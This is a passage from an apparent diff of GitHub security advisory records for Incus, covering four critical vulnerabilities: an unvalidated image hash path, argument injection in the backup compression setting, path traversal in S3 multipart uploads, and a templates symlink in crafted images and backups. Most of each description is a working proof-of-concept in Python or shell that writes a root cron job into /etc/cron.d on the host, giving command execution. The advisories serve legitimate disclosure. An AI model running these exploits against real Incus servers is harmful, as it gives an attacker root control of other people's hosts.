parser.add_argument(\"--command\", default=\"id > /tmp/incus-direct-image-url-rce\", help=\"command cron should run\")\n    parser.add_argument(\"--execute-trigger\", action=\"store_true\", help=\"start server and trigger POST /1.0/images\")\n    parser.add_argument(\"--yes-i-understand-this-writes-host-file\", action=\"store_true\", help=\"required with --execute-trigger\")\n    args = parser.parse_args()\n\n    if bool(args.cert) != bool(args.key):\n        parser.error(\"--cert and --key must be supplied together\")\n    if args.execute_trigger and not args.yes_i_understand_this_writes_host_file:\n        parser.error(\"--execute-trigger requires --yes-i-understand-this-writes-host-file\")\n\n    payload = cron_payload(args.command)\n    trigger_body = image_url_body(args.advertise_url, args.public)\n\n    print(\"[*] exploit primitive: direct image URL unvalidated hash path host write\")\n    print(f\"[*] HEAD URL served to daemon: {args.advertise_url.rstrip()}/stage\")\n    print(f\"[*] returned Incus-Image-Hash: {args.hash_path}\")\n    print(f\"[*] returned Incus-Image-URL: {args.advertise_url.rstrip()}/payload\")\n    print(f\"[*] expected escaped host target from default Incus dir: /etc/cron.d/incus-direct-image-url-rce\")\n    print(f\"[*] cron payload: {payload.decode().rstrip()}\")\n    print(f\"[*] trigger body: {json.dumps(trigger_body, sort_keys=True)}\")\n\n    if not args.execute_trigger:\n        print(\"[*] dry run only; pass --execute-trigger and --yes-i-understand-this-writes-host-file to test\")\n        return 0\n\n    server = start_server(args, payload)\n    print(f\"[*] HTTP server listening on {args.listen_host}:{args.listen_port}\")\n\n    status, data = request_json(args, \"POST\", images_path(args.project), trigger_body, allow_error=True)\n    print(f\"[*] POST /1.0/images HTTP {status}: {json.dumps(data, indent=2, sort_keys=True)}\")\n\n    if server.payload_requested.wait(timeout=min(args.hold_seconds, 30)):\n        print(\"[*] daemon requested payload; cron file should exist until the held response is released\")\n    else:\n        print(\"[!] daemon did not request payload within the wait window\")\n\n    print(\"[*] leaving HTTP server active for the remaining hold window\")\n    time.sleep(max(0, args.hold_seconds - 30))\n    server.shutdown()\n    server.server_close()\n    return 0\n\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except BrokenPipeError:\n        raise SystemExit(1)\n    except Exception as exc:\n        print(f\"[-] {exc}\", file=sys.stderr)\n        raise SystemExit(1)\n```\n\n\n### Impact\n\nAn arbitrary file write on the client with root privileges; possibly leading to arbitrary command execution.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-f6m5-xw2g-xc4x",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-f6m5-xw2g-xc4x",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48769",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x",
+      "https://github.com/advisories/GHSA-f6m5-xw2g-xc4x"
+    ],
+    "published_at": "2026-06-26T19:13:18Z",
+    "updated_at": "2026-06-26T19:13:19Z",
+    "github_reviewed_at": "2026-06-26T19:13:18Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-v6mj-8pf4-hhw4",
+    "cve_id": "CVE-2026-48755",
+    "url": "https://api.github.com/advisories/GHSA-v6mj-8pf4-hhw4",
+    "html_url": "https://github.com/advisories/GHSA-v6mj-8pf4-hhw4",
+    "summary": "Incus has an argument injection in backup compression algorithm leading to AFW and ACE",
+    "description": "### Summary\n\nImproper validation of user-provided backup compression algorithm leads to argument injection in the constructed command line. This leads to an arbitrary file write on the host, possibly leading to arbitrary command execution.\n\n\n### Details\n\nIncus validates `compression_algorithm` by parsing it into fields and checking only the first token against an allowlist:\n\n```go\nfields, err := shellquote.Split(value)\n...\nif !slices.Contains([]string{\"bzip2\", \"gzip\", \"lz4\", \"lzma\", \"pigz\", \"pzstd\", \"pxz\", \"tar2sqfs\", \"xz\", \"zstd\"}, fields[0]) {\n    return fmt.Errorf(\"Compression algorithm %q isn't currently supported\", fields[0])\n}\n_, err = exec.LookPath(fields[0])\n```\n\nExtra arguments are not rejected. `compressFile()` then prepends `-c` and passes the remaining user-supplied fields to the compressor:\n\n```go\nargs := []string{\"-c\"}\nif len(fields) > 1 {\n    args = append(args, fields[1:]...)\n}\ncmd := exec.Command(fields[0], args...)\ncmd.Stdin = infile\ncmd.Stdout = outfile\n```\n\nWith a value like:\n\n```text\nzstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload\n```\n\nthe daemon executes the equivalent of:\n\n```text\nzstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload\n```\n\n### PoC\n\n```\npython3 poc.py \\\n\t--insecure --url https://remote-incus:8443 \\\n\t--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \\\n\t--instance c01 \\\n\t--execute --yes-i-understand-this-writes-host-file\n```\n\nThe following was generated by an LLM model.\n\n```\n#!/usr/bin/env python3\n\"\"\"Short remote Incus backup compression zstd cron RCE PoC.\n\nDry-run is the default.  --execute uploads a cron payload into an instance and then asks Incus for a direct backup with a zstd argument-injection compressor:\n\n    zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- <source>\n\nThe direct backup may fail after zstd runs; the host file write is the primitive. Use only on an authorized Incus server.\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport json\nimport os\nimport shlex\nimport sys\nimport urllib.parse\nfrom pathlib import PurePosixPath\nfrom typing import Any\n\nimport requests\n\n\ndef q(value: str) -> str:\n    return urllib.parse.quote(value, safe=\"\")\n\n\ndef api(base: str, endpoint: str, **params: str) -> str:\n    return base.rstrip(\"/\") + endpoint + (\"?\" + urllib.parse.urlencode(params) if params else \"\")\n\n\ndef project_instance(project: str, instance: str) -> str:\n    return instance if project == \"default\" else f\"{project}_{instance}\"\n\n\ndef clean_guest_path(path: str) -> str:\n    if not path.startswith(\"/\"):\n        raise ValueError(\"--guest-path must be absolute\")\n    if \"..\" in PurePosixPath(path).parts:\n        raise ValueError(\"--guest-path must not contain '..'\")\n    return os.path.normpath(\"/\" + path.lstrip(\"/\")).lstrip(\"/\")\n\n\ndef source_path(args: argparse.Namespace) -> str:\n    if args.source_host_path:\n        return args.source_host_path\n    return os.path.join(\n        args.incus_dir,\n        \"storage-pools\",\n        args.pool,\n        args.storage_kind,\n        project_instance(args.project, args.instance),\n        \"rootfs\",\n        clean_guest_path(args.guest_path),\n    )\n\n\ndef cron(command: str) -> bytes:\n    return f\"* * * * * root /bin/sh -c {shlex.quote(command)}\\n\".encode()\n\n\ndef session(args: argparse.Namespace) -> requests.Session:\n    s = requests.Session()\n    s.verify = False if args.insecure else (args.cacert or True)\n    if args.cert or args.key:\n        s.cert = (args.cert, args.key)\n    if args.token:\n        s.headers[\"Authorization\"] = \"Bearer \" + args.token\n    s.headers[\"User-Agent\"] = \"incus-zstd-backup-rce-poc\"\n    if args.insecure:\n        requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]\n    return s\n\n\ndef check(resp: requests.Response, what: str) -> requests.Response:\n    if resp.status_code >= 400:\n        try:\n            detail: Any = resp.json()\n        except Exception:\n            detail = resp.text[:2048]\n        raise RuntimeError(f\"{what} failed: HTTP {resp.status_code}: {detail}\")\n    return resp\n\n\ndef upload(s: requests.Session, args: argparse.Namespace, payload: bytes) -> None:\n    url = api(args.url, f\"/1.0/instances/{q(args.instance)}/files\", project=args.project, path=args.guest_path)\n    headers = {\n        \"Content-Type\": \"application/octet-stream\",\n        \"X-Incus-type\": \"file\",\n        \"X-Incus-write\": \"overwrite\",\n        \"X-Incus-uid\": \"0\",\n        \"X-Incus-gid\": \"0\",\n        \"X-Incus-mode\": \"0644\",\n    }\n    print(f\"[*] uploading cron payload to {args.instance}:{args.guest_path}\")\n    check(s.post(url, data=payload, headers=headers, timeout=args.timeout), \"payload upload\")\n\n\ndef trigger_backup(s: requests.Session, args: argparse.Namespace, body: dict[str, Any]) -> None:\n    url = api(args.url, f\"/1.0/instances/{q(args.instance)}/backups\", project=args.project)\n    print(\"[*] sending direct backup request\")\n    resp = s.post(\n        url,\n        data=json.dumps(body).encode(),\n        headers={\"Accept\": \"application/octet-stream\", \"Content-Type\": \"application/json\"},\n        timeout=args.timeout,\n        stream=True,\n    )\n    print(f\"[*] backup HTTP {resp.status_code}\")\n    resp.close()\n    if resp.status_code >= 400:\n        print(\"[*] HTTP error after compressor launch is possible; check whether the cron file was written\")\n\n\ndef parse_args() -> argparse.Namespace:\n    p = argparse.ArgumentParser(description=\"Remote Incus zstd backup-compression cron RCE PoC\")\n    p.add_argument(\"--url\", required=True, help=\"https://host:8443\")\n    p.add_argument(\"--cert\", help=\"client certificate PEM\")\n    p.add_argument(\"--key\", help=\"client private key PEM\")\n    p.add_argument(\"--cacert\", help=\"CA certificate PEM\")\n    p.add_argument(\"--token\", help=\"bearer token\")\n    p.add_argument(\"--insecure\", action=\"store_true\", help=\"disable TLS verification\")\n    p.add_argument(\"--timeout\", type=int, default=180)\n\n    p.add_argument(\"--project\", default=\"default\")\n    p.add_argument(\"--instance\", required=True)\n    p.add_argument(\"--pool\", default=\"default\")\n    p.add_argument(\"--storage-kind\", choices=[\"containers\", \"virtual-machines\"], default=\"containers\")\n    p.add_argument(\"--incus-dir\", default=\"/var/lib/incus\")\n    p.add_argument(\"--guest-path\", default=\"/incus-zstd-cron\")\n    p.add_argument(\"--source-host-path\", help=\"override daemon-readable host path for the staged payload\")\n    p.add_argument(\"--cron-path\", default=\"/etc/cron.d/incus-zstd-rce\")\n    p.add_argument(\"--command\", default=\"date >/incus-zstd-rce; id >>/incus-zstd-rce\")\n\n    p.add_argument(\"--execute\", action=\"store_true\", help=\"stage payload and send backup request\")\n    p.add_argument(\"--yes-i-understand-this-writes-host-file\", action=\"store_true\", help=\"required with --execute\")\n    args = p.parse_args()\n\n    if urllib.parse.urlparse(args.url).scheme != \"https\":\n        p.error(\"--url must use https\")\n    if bool(args.cert) != bool(args.key):\n        p.error(\"--cert and --key must be supplied together\")\n    if args.execute and not args.yes_i_understand_this_writes_host_file:\n        p.error(\"--execute requires --yes-i-understand-this-writes-host-file\")\n    try:\n        clean_guest_path(args.guest_path)\n    except ValueError as exc:\n        p.error(str(exc))\n\n    args.url = args.url.rstrip(\"/\")\n    return args\n\n\ndef main() -> int:\n    args = parse_args()\n    src = source_path(args)\n    payload = cron(args.command)\n    compressor = f\"zstd -d -f --pass-through -o {shlex.quote(args.cron_path)} -- {shlex.quote(src)}\"\n    body = {\"compression_algorithm\": compressor, \"instance_only\": True}\n\n    print(\"[*] target:\", args.url)\n    print(\"[*] project:\", args.project)\n    print(\"[*] instance:\", args.instance)\n    print(\"[*] source host path:\", src)\n    print(\"[*] cron path:\", args.cron_path)\n    print(\"[*] payload:\", payload.decode().rstrip())\n    print(\"[*] backup body:\", json.dumps(body, sort_keys=True))\n\n    if not args.execute:\n        print(\"[*] dry run only; add --execute and the confirmation flag to act\")\n        return 0\n\n    s = session(args)\n    upload(s, args, payload)\n    trigger_backup(s, args, body)\n    return 0\n\n\nif __name__ == \"__main__\":\n    try:\n        raise SystemExit(main())\n    except BrokenPipeError:\n        raise SystemExit(1)\n    except Exception as exc:\n        print(f\"[-] {exc}\", file=sys.stderr)\n        raise SystemExit(1)\n```\n\n\n### Impact\n\nImproperly validated compression algorithm argument leads to argument injection leading to arbitrary file write with `zstd` and possibly arbitrary command execution.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-v6mj-8pf4-hhw4",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-v6mj-8pf4-hhw4",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48755",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4",
+      "https://github.com/advisories/GHSA-v6mj-8pf4-hhw4"
+    ],
+    "published_at": "2026-06-26T19:03:31Z",
+    "updated_at": "2026-06-26T19:03:32Z",
+    "github_reviewed_at": "2026-06-26T19:03:31Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.2.0",
+        "first_patched_version": "7.2.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-20",
+        "name": "Improper Input Validation"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    }
+  },
+  {
+    "ghsa_id": "GHSA-ccjc-4qc3-jxqc",
+    "cve_id": "CVE-2026-48753",
+    "url": "https://api.github.com/advisories/GHSA-ccjc-4qc3-jxqc",
+    "html_url": "https://github.com/advisories/GHSA-ccjc-4qc3-jxqc",
+    "summary": "Incus has an arbitrary file write via path traversal in S3 multipart upload",
+    "description": "## Summary\n\nThe S3 protocol upload endpoint is vulnerable to path traversal and allows creation of arbitrary files on the host. This behavior could lead to arbitrary command execution.\n\nIn `internal/server/storage/s3/local/multipart.go`, user-controlled upload ID is appended to the uploads directory unsanitized; https://github.com/lxc/incus/blob/40dd4f151d52c06b178482aa2518abfb9df3e6fb/internal/server/storage/s3/local/multipart.go#L33\n\n## PoC\n\n### Setup\n\n```\n# Expose the S3 API and create a bucket\nincus config set core.storage_buckets_address=:8555\nincus storage volume create default bucket\n#> note the credentials\n```\n\n### Exploitation\n\nThe below script was mostly generated.\n\n```\n#!/usr/bin/env bash\nset -euo pipefail\n\nif [ $# -lt 4 ]; then\n\tprintf 'usage: $0 endpoint bucket access-key secret-key\\n' >&2\n\texit 1\nfi\n\nendpoint=\"${1%/}\"\nbucket=\"${2}\"\naccess=\"${3}\"\nsecret=\"${4}\"\n\nregion=\"us-east-1\"\nservice=\"s3\"\nkey=\"anything\"\npart=\"1\"\nupload_id=\"../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/cron.d\"\ntarget=\"/etc/cron.d/part-00001\"\ncmd=\"id > /incus-s3-uploadid-bash-rce; rm -f $target\"\nbody=\"* * * * * root /bin/sh -c '$cmd'\n\"\n\nuri_path=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://[^/]+##')/$bucket/$key\"\nuri_path=\"${uri_path#/}\"\nuri_path=\"/$uri_path\"\nhost=\"$(printf '%s' \"$endpoint\" | sed -E 's#^[a-z]+://([^/]+).*#\\1#')\"\nqs=\"partNumber=$part&uploadId=${upload_id//\\//%2F}\"\nurl=\"$endpoint/$bucket/$key?$qs\"\n\namz_date=$(date -u +%Y%m%dT%H%M%SZ)\ndate_scope=\"${amz_date:0:8}\"\nscope=\"$date_scope/$region/$service/aws4_request\"\nbody_hash=$(printf '%s' \"$body\" | sha256sum | awk '{print $1}')\nsigned=\"host;x-amz-content-sha256;x-amz-date\"\n\ncanonical=\"PUT\n$uri_path\n$qs\nhost:$host\nx-amz-content-sha256:$body_hash\nx-amz-date:$amz_date\n\n$signed\n$body_hash\"\ncanonical_hash=\"$(printf '%s' \"$canonical\" | sha256sum | awk '{print $1}')\"\nstring_to_sign=\"AWS4-HMAC-SHA256\n$amz_date\n$scope\n$canonical_hash\"\n\nhmac_hex() {\n\tprintf '%s' \"${2}\" | openssl dgst -sha256 -mac HMAC -macopt \"hexkey:${1}\" -binary | xxd -p -c 256\n}\n\nk_date=$(printf 'AWS4%s' \"$secret\" | xxd -p -c 256)\nk_date=$(hmac_hex \"$k_date\" \"$date_scope\")\nk_region=$(hmac_hex \"$k_date\" \"$region\")\nk_service=$(hmac_hex \"$k_region\" \"$service\")\nk_signing=$(hmac_hex \"$k_service\" \"aws4_request\")\nsig=$(hmac_hex \"$k_signing\" \"$string_to_sign\")\nauth=\"AWS4-HMAC-SHA256 Credential=${access}/${scope},SignedHeaders=${signed},Signature=${sig}\"\n\nprintf '# body:\\n%s' \"${body}\"\n\ncurl -ksS -X PUT \"${url}\" \\\n\t-H \"Host: ${host}\" \\\n\t-H \"X-Amz-Date: ${amz_date}\" \\\n\t-H \"X-Amz-Content-Sha256: ${body_hash}\" \\\n\t-H \"Authorization: ${auth}\" \\\n\t--data-binary \"${body}\"\n```\n\n\n## Impact\n\nArbitrary file write on the host. Possibly leading to arbitrary command execution.",
+    "type": "reviewed",
+    "severity": "critical",
+    "repository_advisory_url": "https://api.github.com/repos/lxc/incus/security-advisories/GHSA-ccjc-4qc3-jxqc",
+    "source_code_location": "https://github.com/lxc/incus",
+    "identifiers": [
+      {
+        "value": "GHSA-ccjc-4qc3-jxqc",
+        "type": "GHSA"
+      },
+      {
+        "value": "CVE-2026-48753",
+        "type": "CVE"
+      }
+    ],
+    "references": [
+      "https://github.com/lxc/incus/security/advisories/GHSA-ccjc-4qc3-jxqc",
+      "https://github.com/advisories/GHSA-ccjc-4qc3-jxqc"
+    ],
+    "published_at": "2026-06-26T18:47:25Z",
+    "updated_at": "2026-06-26T18:47:27Z",
+    "github_reviewed_at": "2026-06-26T18:47:25Z",
+    "nvd_published_at": null,
+    "withdrawn_at": null,
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/lxc/incus/v7/cmd/incusd"
+        },
+        "vulnerable_version_range": "< 7.1.0",
+        "first_patched_version": "7.1.0",
+        "vulnerable_functions": [
+
+        ]
+      }
+    ],
+    "cvss_severities": {
+      "cvss_v3": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+        "score": 9.9
+      },
+      "cvss_v4": {
+        "vector_string": null,
+        "score": 0.0
+      }
+    },
+    "cwes": [
+      {
+        "cwe_id": "CWE-73",
+        "name": "External Control of File Name or Path"
+      }
+    ],
+    "credits": [
+      {
+        "user": {
+          "login": "antifob",
+          "id": 25389335,
+          "node_id": "MDQ6VXNlcjI1Mzg5MzM1",
+          "avatar_url": "https://avatars.githubusercontent.com/u/25389335?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/antifob",
+          "html_url": "https://github.com/antifob",
+          "followers_url": "https://api.github.com/users/antifob/followers",
+          "following_url": "https://api.github.com/users/antifob/following{/other_user}",
+          "gists_url": "https://api.github.com/users/antifob/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/antifob/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/antifob/subscriptions",
+          "organizations_url": "https://api.github.com/users/antifob/orgs",
+          "repos_url": "https://api.github.com/users/antifob/repos",
+          "events_url": "https://api.github.com/users/antifob/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/antifob/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "reporter"
+      },
+      {
+        "user": {
+          "login": "stgraber",
+          "id": 2230599,
+          "node_id": "MDQ6VXNlcjIyMzA1OTk=",
+          "avatar_url": "https://avatars.githubusercontent.com/u/2230599?v=4",
+          "gravatar_id": "",
+          "url": "https://api.github.com/users/stgraber",
+          "html_url": "https://github.com/stgraber",
+          "followers_url": "https://api.github.com/users/stgraber/followers",
+          "following_url": "https://api.github.com/users/stgraber/following{/other_user}",
+          "gists_url": "https://api.github.com/users/stgraber/gists{/gist_id}",
+          "starred_url": "https://api.github.com/users/stgraber/starred{/owner}{/repo}",
+          "subscriptions_url": "https://api.github.com/users/stgraber/subscriptions",
+          "organizations_url": "https://api.github.com/users/stgraber/orgs",
+          "repos_url": "https://api.github.com/users/stgraber/repos",
+          "events_url": "https://api.github.com/users/stgraber/events{/privacy}",
+          "received_events_url": "https://api.github.com/users/stgraber/received_events",
+          "type": "User",
+          "user_view_type": "public",
+          "site_admin": false
+        },
+        "type": "remediation_developer"
+      }
+    ],
+    "cvss": {
+      "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H",
+      "score": 9.9
+    },
+    "epss": {
+      "percentage": 0.00091,
+      "percentile": 0.25895
+    }
+  },
+  {
+    "ghsa_id": "GHSA-vxp5-584q-c479",
+    "cve_id": "CVE-2026-48752",
+    "url": "https://api.github.com/advisories/GHSA-vxp5-584q-c479",
+    "html_url": "https://github.com/advisories/GHSA-vxp5-584q-c479",
+    "summary": "Incus has arbitrary file read+write on host via templates/ symlink in malicious image",
+    "description": "### Summary\n\nA specially crafted image or instance backup can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.\n\n\n### Details\n\nFor container images, `internal/server/storage/utils.go` calls `archive.Unpack(imageFile, destPath, ...)`. The tar extraction path in `shared/archive/archive.go` excludes device nodes, but it does not reject a top-level `templates` symlink.\n\nFor instance backups, `internal/server/storage/drivers/driver_dir_volumes.go:rsync.LocalCopy` uses argument `-a` (archive mode), but does not add `--safe-links`. This allows a top-level `templates` symlink.\n\nIn practice, this allows a malicious actor to access an arbitrary directory and edit arbitrary files in it.\n\n\n### PoC\n\n#### Malicious container image\n\nBelow, the templates directory is  mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/templates\"\ncat<<__EOF__>\"${tmpdir}/img/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: PoC templates symlink host afrw\n__EOF__\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c * >../afrw-image-templates-symlink.tar\nincus image import ../afrw-image-templates-symlink.tar --alias afrw-image-templates-symlink\nincus init afrw-image-templates-symlink afrw-image-templates-symlink\n\nincus config template ls afrw-image-templates-symlink\n\n# read\n#incus config template show afrw-image-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-image-templates-symlink poc-32\n#incus config template edit afrw-image-templates-symlink poc\n```\n\n#### Malicious instance backup\n\n\nBelow, the templates directory is mapped to `/etc/cron.d` on the host, but it can be mapped anywhere. After that, create a cronjob to run `id` as root.\n\n```\n#!/bin/sh\nset -eu\n\ntmpdir=$(mktemp -d)\ncleanup() {\n    rm -rf \"${tmpdir}\"\n}\ntrap cleanup EXIT INT QUIT TERM HUP\n\nmkdir -p \"${tmpdir}/img/backup\"\ncat<<__EOF__>\"${tmpdir}/img/backup/index.yaml\"\nname: afrw-backup-templates-symlink\nbackend: dir\npool: default\ntype: container\noptimized: false\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container\"\ncat<<__EOF__>\"${tmpdir}/img/backup/container/backup.yaml\"\ncontainer:\n  name: afrw-backup-templates-symlink\n  architecture: x86_64\n  type: container\n  status: Stopped\n  status_code: 102\n  stateful: false\n  ephemeral: false\n  profiles:\n    - default\n  config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  expanded_config:\n    volatile.uuid: 58a0f7de-2490-4e85-9fb2-153ef0fc7be5\n    volatile.uuid.generation: 24d829e5-d74a-4285-88c0-be369140fb49\n  devices: {}\n  expanded_devices:\n    root:\n      path: /\n      pool: default\n      type: disk\n  created_at: \"2024-01-01T00:00:00Z\"\n  last_used_at: \"2024-01-01T00:00:00Z\"\nvolume:\n  name: afrw-backup-templates-symlink\n  type: container\n  content_type: filesystem\n  config: {}\npool:\n  name: default\n  driver: dir\n  config: {}\n__EOF__\n\ncat<<__EOF__>\"${tmpdir}/img/backup/container/metadata.yaml\"\narchitecture: x86_64\ncreation_date: 1\nproperties:\n  description: afrw-backup-templates-symlink\n__EOF__\n\nmkdir \"${tmpdir}/img/backup/container/rootfs\"\nln -s /etc/cron.d \"${tmpdir}/img/backup/container/templates\"\n\ncd \"${tmpdir}/img\"\ntar --owner=0 --group=0 -f- -c backup >../afrw-backup-templates-symlink.tar\nincus import ../afrw-backup-templates-symlink.tar afrw-backup-templates-symlink\n\nincus config template ls afrw-backup-templates-symlink\n\n# read\n#incus config template show afrw-backup-templates-symlink $FILENAME\n\n# write\nprintf \"* * * * * root sh -c 'id>/pwned'\\n\" | incus config template create afrw-backup-templates-symlink poc-32\n#incus config template edit afrw-templates-symlink poc\n```\n\n### Impact\n\nArbitrary file read and write on the host via unsanitized symlink; possibly leading to command execution.",
+    "type": "reviewed",
+    "severity": "critical",
